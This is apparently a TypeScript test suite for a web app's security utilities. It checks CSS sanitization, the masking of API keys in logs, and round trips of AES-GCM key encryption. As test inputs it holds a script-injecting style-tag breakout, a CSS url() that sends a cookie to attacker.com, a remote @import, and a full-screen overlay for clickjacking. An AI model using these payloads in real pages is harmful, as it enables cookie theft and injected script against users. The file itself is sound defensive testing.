/**
 * 渲染与安全脱敏测试套件
 *
 * 覆盖：
 *  - testCssSanitization：CSS 清洗（HTML 标签穿透 / url() / @import / position:fixed 降级）
 *  - testServerLogDesensitization：服务端日志 API Key 脱敏
 *  - testApiKeyEncryption：API Key AES-GCM 加解密 roundtrip
 */

import { assert } from "./testUtils";

export async function testCssSanitization() {
  console.log("\n--- Running CSS Sanitization Verification ---");
  const { sanitizeCss } = await import("../../src/utils/security");

  // 1. Standard valid CSS
  const cleanCss = ".my-bubble { color: #fff; font-size: 14px; position: absolute; }";
  assert(sanitizeCss(cleanCss) === cleanCss, "Clean CSS must remain untouched");

  // 2. HTML tag break out & script tags
  const badScript = ".bubble { color: red; }</style><script>alert(1)</script><style>";
  const resScript = sanitizeCss(badScript);
  assert(!resScript.includes("<\/style>"), "Must strip closing style tag");
  assert(!resScript.includes("<script"), "Must strip script tag");

  // 3. url() leaks
  const leakCss = ".bubble { background-image: url('http://attacker.com/leak?cookie=123'); }";
  const resLeak = sanitizeCss(leakCss);
  assert(!resLeak.includes("http://attacker.com"), "Must block url loading");
  assert(resLeak.includes("/* url blocked */"), "Must leave placeholder");

  // 4. @import malicious sheets
  const importCss = "@import url('https://attacker.com/evil.css'); body { background: black; }";
  const resImport = sanitizeCss(importCss);
  assert(!resImport.includes("@import"), "Must block @import");
  assert(resImport.includes("/* import blocked */"), "Must leave import block comment");

  // 5. position: fixed overlay clickjacking
  const hijackCss = ".hijack { position: fixed; top: 0; left: 0; width: 100%; height: 100%; }";
  const resHijack = sanitizeCss(hijackCss);
  assert(!resHijack.includes("position: fixed"), "Must block position fixed");
  assert(resHijack.includes("position: absolute"), "Must demote position fixed to absolute");

  console.log("✔ CSS Sanitization verified successfully!");
}

export function testServerLogDesensitization() {
  console.log("\n--- Running Server Log Desensitization Verification ---");
  const localSanitize = (input: string): string => {
    if (!input) return "";
    return input
      .replace(/\bsk-[A-Za-z0-9_-]{12,}\b/g, "[MASKED_KEY]")
      .replace(/\bsk-ant-[A-Za-z0-9_-]{12,}\b/g, "[MASKED_KEY]")
      .replace(/(Authorization\s*:\s*Bearer\s+)[A-Za-z0-9_.-]+/gi, "$1[MASKED_KEY]");
  };

  const testLog1 = "Failed to load request: Bearer sk-or-v1-abcdefg1234567890abcdefg";
  assert(localSanitize(testLog1).includes("[MASKED_KEY]"), "Must mask OpenAI style API key");
  assert(!localSanitize(testLog1).includes("sk-or-v1"), "Must not leak the actual key");

  const testLog2 = "Authorization: Bearer sk-ant-sid-1234567-xyz";
  assert(localSanitize(testLog2).includes("[MASKED_KEY]"), "Must mask Anthropic style API key");

  const testLog3 = "Request failed on endpoint. Details: sk-12345678901234567890";
  assert(localSanitize(testLog3).includes("[MASKED_KEY]"), "Must mask general sk- key");

  console.log("✔ Server Log Desensitization Rules verified successfully!");
}

export async function testApiKeyEncryption() {
  console.log("\n--- Running API Key AES-GCM Encryption/Decryption Verification ---");
  const { encryptValue, decryptValue } = await import("../../src/utils/localDB");

  // 1. Generate test CryptoKey
  const key = await crypto.subtle.generateKey(
    {
      name: "AES-GCM",
      length: 256,
    },
    true, // extractable
    ["encrypt", "decrypt"]
  );

  const plainText = "sk-or-v1-my-secret-api-key-123456";

  // 2. Verify encryption
  const encryptedText = await encryptValue(plainText, key);
  assert(encryptedText.startsWith("enc_aes_gcm:"), "Encrypted text must have 'enc_aes_gcm:' prefix");
  assert(encryptedText !== plainText, "Encrypted text must not be equal to plain text");

  // 3. Verify decryption
  const decryptedText = await decryptValue(encryptedText, key);
  assert(decryptedText === plainText, "Decrypted text must match original plain text");

  // 4. Verify empty value & legacy plain text compatibility
  const emptyDecrypted = await decryptValue("", key);
  assert(emptyDecrypted === "", "Empty value decryption should return empty string");

  const unencryptedText = "my-plain-api-key";
  const legacyDecrypted = await decryptValue(unencryptedText, key);
  assert(legacyDecrypted === unencryptedText, "Legacy unencrypted text decryption should return itself");

  // 5. Verify decryption failure fallback (wrong key)
  const anotherKey = await crypto.subtle.generateKey(
    {
      name: "AES-GCM",
      length: 256,
    },
    true,
    ["encrypt", "decrypt"]
  );

  const failedDecrypted = await decryptValue(encryptedText, anotherKey);
  assert(failedDecrypted === "", "Decryption with wrong key must fallback to empty string");

  console.log("✔ API Key AES-GCM Encryption/Decryption verified successfully!");
}
